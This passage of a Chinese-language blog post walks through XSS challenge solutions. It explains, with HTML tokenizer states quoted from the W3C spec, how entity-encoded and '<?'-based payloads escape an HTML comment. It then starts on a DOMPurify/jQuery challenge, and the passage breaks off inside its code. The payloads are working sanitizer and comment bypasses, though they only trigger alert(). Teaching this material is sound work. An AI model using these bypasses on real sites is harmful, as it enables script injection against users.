href="https://blog.zeddyu.info/2019/03/13/Web&#x5B89;&#x5168;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;-XSS-I/#Encode">&#x5173;&#x4E8E; HTML &#x7F16;&#x7801;</a> &#x7684;&#x6C34;&#x6587;&#x3002;</p><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x7B2C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5F53;&#x65F6;&#x7531;&#x4E8E;&#x51FA;&#x9898;&#x8005;&#x6BD4;&#x8F83;&#x758F;&#x5FFD;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x76F4;&#x63A5;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x8FDB;&#x800C;&#x5B9E;&#x73B0; alert &#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x505A;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x3E;</span><span class="hljs-symbol">&amp;#x3C;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3E;</span>&quot;</span>&gt;</span>1</span><br></pre></td></tr></table></figure><p>&#x4F7F;&#x7528; HTML &#x7F16;&#x7801;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x8FDB;&#x884C;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert()</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png" alt></p><p>&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x5165; HTML &#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x5229;&#x7528;&#x5176;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6709;&#x4E24;&#x6B21; HTML &#x89E3;&#x7801;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;<code>template.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;<code>pwnme.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x4F1A;&#x76F4;&#x63A5;&#x628A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5176;&#x4E2D;&#x7684;<code>&lt;&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x7B2C;&#x4E00;&#x4E2A;&#x5F97;&#x5230;&#x7684;&#x662F;&#x5982;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</p><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>svg/onload=alert()<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure><p>&#x5728;&#x7B2C;&#x4E8C;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x81EA;&#x7136;&#x4E0D;&#x53EF;&#x80FD;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x4E86;&#xFF0C;&#x53EA;&#x80FD;&#x5F97;&#x5230;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x501F;&#x52A9; img &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;</span>&gt;</span>1</span><br></pre></td></tr></table></figure><p>HTML parser&#x4E0D;&#x4F1A;&#x5C06; title &#x5C5E;&#x6027;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;&#x7B2C;&#x4E8C;&#x6B65;&#x5F53;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;img title=&quot;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;gt;</span>1 <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure><p>&#x7136;&#x540E;&#x5F53; HTML parser &#x89E3;&#x6790;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x7531;<code>&lt;!</code>&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x4F1A;&#x8FDB;&#x5165;<a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">Markup declaration open state</a>&#xFF0C;&#x4E2D;&#x95F4;&#x7684;&#x4EE3;&#x7801;<code>&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;</code>&#x4F1A;&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5173;&#x4E8E; comment &#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x65E0;&#x5173;&#x7D27;&#x8981;&#xFF0C;&#x6700;&#x540E;&#x7684;<code>--&gt;</code>&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x5230;&#x4E86;<a href="https://www.w3.org/TR/html52/syntax.html#comment-end-state" target="_blank" rel="noopener">Comment End State</a>&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;&#xFF1A;</p><blockquote><p>Comment end state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li></ul></blockquote><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x8FDB;&#x5165;&#x5230;&#x4E86; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ED3;&#x675F;&#x4E86;&#x6CE8;&#x91CA;&#x89E3;&#x6790;&#x72B6;&#x6001;&#x56DE;&#x5230;&#x4E86;&#x6700;&#x5F00;&#x59CB;&#x7684; HTML &#x89E3;&#x6790;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x9003;&#x9038;&#x4E86;&#x6CE8;&#x91CA;&#x7B26;&#x3002;</p><h3 id="Difficult-Version"><a href="#Difficult-Version" class="headerlink" title="Difficult Version"></a>Difficult Version</h3><p>&#x518D;&#x8FC7;&#x6EE4;&#x4E86;&#x5B9E;&#x4F53;&#x7F16;&#x7801;<code>&amp;#;</code>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8981;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5148;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A; Trick &#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;?</code>&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>&lt;?</code>&#x4E4B;&#x540E;&#x6210;&#x529F;&#x628A; p &#x6807;&#x7B7E;&#x9003;&#x9038;&#x4E86;&#x51FA;&#x6765;&#xFF0C;&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x6B65;&#x7684;<code>template.innerHTML</code>&#x770B;&#x770B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5728;&#x7B2C;&#x4E00;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F20;&#x5165;&#x7684;<code>&lt;?</code>&#x5DF2;&#x7ECF;&#x53D8;&#x6210;&#x4E86;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x5B58;&#x5728;<code>--&gt;</code>&#x53EF;&#x4EE5;&#x5C06;&#x6CE8;&#x91CA;&#x95ED;&#x5408;&#x3002;&#x53EF;&#x662F;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x5728;<code>template.innerHTML = input</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E3;&#x6790;<code>input</code>&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;</p><blockquote><p>&#x200B;    Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></blockquote><p>&#x89E3;&#x6790;&#x5230;<code>&lt;</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;HTML parser &#x6B63;&#x5904;&#x4E8E; <a href="https://www.w3.org/TR/html52/syntax.html#data-state" target="_blank" rel="noopener">data state</a></p><blockquote><p>Data state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&amp;)</p><p>Set the <a href="https://www.w3.org/TR/html52/syntax.html#return-state" target="_blank" rel="noopener">return state</a> to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state" target="_blank" rel="noopener">character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li></ul></blockquote><p>&#x4E8E;&#x662F;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state" target="_blank" rel="noopener">end tag open state</a>.</p></li><li><p><a href="https://www.w3.org/TR/html52/infrastructure.html#ascii-letters" target="_blank" rel="noopener">ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state" target="_blank" rel="noopener">tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Create a comment token whose data is the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>.</p></li><li><p>Anything else</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F;<code>?</code>&#xFF0C;&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;HTML parser &#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; comment token&#xFF0C;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>&#xFF0C;</p><blockquote><p>Bogus comment state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token&#x2019;s data.</p></li><li><p>Anything else</p><p>Append the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> to the comment token&#x2019;s data.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F; anything else&#xFF0C;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x63D2;&#x5165;&#x5230;&#x521A;&#x521A;&#x7684; comment &#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x56FE;&#x770B;&#x5230;&#x7684;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x4F8B;&#x5982;&#x8F93;&#x5165;&#x662F;<code>aaa&lt;?bbb&gt;ccc</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x89E3;&#x6790;&#x5230;&#x7B2C; i &#x4E2A;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;innerHTML &#x7684;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><figure class="highlight django hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">a</span></span><br><span class="line"><span class="hljs-xml">aa</span></span><br><span class="line"><span class="hljs-xml">aaa</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-tag">&lt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?b--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>c</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>cc</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>ccc</span></span><br></pre></td></tr></table></figure><p>&#x76F4;&#x5230;&#x8BE5;&#x72B6;&#x6001;&#x9047;&#x5230;&#x4E86;<code>&gt;</code>&#x4E3A;&#x6B62;&#xFF0C;&#x56DE;&#x5230; data state&#x3002;&#x6CE8;&#x610F;&#x8FD9;&#x4E2A; Bogus comment state &#x89E3;&#x6790;&#x5230;<code>&gt;</code>&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x56DE;&#x5230; data state&#xFF0C;&#x4E5F;&#x5C31;&#x662F; HTML parser &#x6700;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63D2;&#x5165; HTML &#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>&lt;?&gt;&lt;svg onload=alert()&gt;</code>&#x65F6;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x7B2C;&#x4E8C;&#x6B65;<code>pwnme.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x65F6;&#x5019; HTML parser &#x89E3;&#x6790;&#x4E0E;&#x6211;&#x4EEC;&#x5728; Easy Version &#x5206;&#x6790;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x6709;&#x9047;&#x5230;<code>--&gt;</code>&#x7684;&#x65F6;&#x5019;&#x7ED3;&#x675F; Comment State &#x76F8;&#x5173;&#x72B6;&#x6001;&#x56DE;&#x5230; data state&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86; XSS&#x3002;</p><h2 id="Keanu"><a href="#Keanu" class="headerlink" title="Keanu"></a>Keanu</h2><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">number</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">number</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcome&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;keanu&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary btn-sm&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;popover&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;DM @PwnFunction&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">data-trigger</span>=<span class="hljs-string">&quot;hover&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;</span>&gt;</span>Solved it?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Input */</span></span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> number = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;number&apos;</span>) || <span class="hljs-string">&quot;7&quot;</span>)[<span class="hljs-number">0</span>],</span></span><br><span class="line"><span class="hljs-actionscript">        name = DOMPurify.sanitize(<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;name&apos;</span>), { SAFE_FOR_JQUERY: <span class="hljs-literal">true</span> });</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;number#number&apos;</span>).html(number);</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#welcome&apos;</span>).html(<span class="hljs-string">`Welcome &lt;b&gt;<span class="hljs-subst">${name || <span class="hljs-string">&quot;Mr. Wick&quot;</span>}</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Greet */</span></span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;show&apos;</span>)</span></span><br><span class="line"><span class="hljs-javascript">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#keanu&apos;</span>).popover(<span class="hljs-string">&apos;hide&apos;</span>)</span></span><br><span class="line">    }, 2000)</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> magicNumber = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> number = <span class="hljs-built_in">eval</span>($(<span class="hljs-string">&apos;number#number&apos;</span>).html());</span></span><br><span class="line">    if (magicNumber === number) {</span><br><span class="line"><span class="hljs-actionscript">        alert(<span class="hljs-string">&quot;You&apos;re Breathtaking!&quot;</span>)</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x672C;&#x9898;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x4E86;&#x56DB;&#x4E2A; js &#x6587;&#x4EF6;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&quot;</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span 